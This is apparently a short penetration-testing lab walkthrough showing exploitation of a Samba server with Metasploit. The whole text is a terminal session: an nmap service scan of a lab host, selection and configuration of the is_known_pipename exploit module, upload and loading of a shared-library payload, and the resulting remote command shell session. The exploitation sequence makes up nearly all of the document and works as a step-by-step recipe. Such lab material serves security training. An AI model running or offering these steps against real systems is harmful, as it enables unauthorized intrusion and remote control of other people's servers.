# Exploiting Samba

```bash
# Start Metasploit
msf6 > db_nmap -sV -O 192.6.113.3
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 09:44 IST
[*] Nmap: Nmap scan report for demo.ine.local (192.6.113.3)
[*] Nmap: Host is up (0.000057s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

# Search module
msf6 > search type:exploit name:samba
msf6 > use exploit/linux/samba/is_known_pipename
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(linux/samba/is_known_pipename) >
msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.6.113.3
RHOSTS => 192.6.113.3

msf6 exploit(linux/samba/is_known_pipename) > run

[*] 192.6.113.3:445 - Using location \\192.6.113.3\exploitable\tmp for the path
[*] 192.6.113.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.6.113.3:445 - Share 'exploitable' has server-side path '/
[*] 192.6.113.3:445 - Uploaded payload to \\192.6.113.3\exploitable\tmp\xtwMInNK.so
[*] 192.6.113.3:445 - Loading the payload from server-side path /tmp/xtwMInNK.so using \\PIPE\/tmp/xtwMInNK.so...
[-] 192.6.113.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.6.113.3:445 - Loading the payload from server-side path /tmp/xtwMInNK.so using /tmp/xtwMInNK.so...
[+] 192.6.113.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.6.113.2:37841 -> 192.6.113.3:445) at 2025-07-24 09:48:15 +0530

# Check if shell session was created
msf6 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.6.113.2:37841 -> 192.6.113.
                                         3:445 (192.6.113.3)
```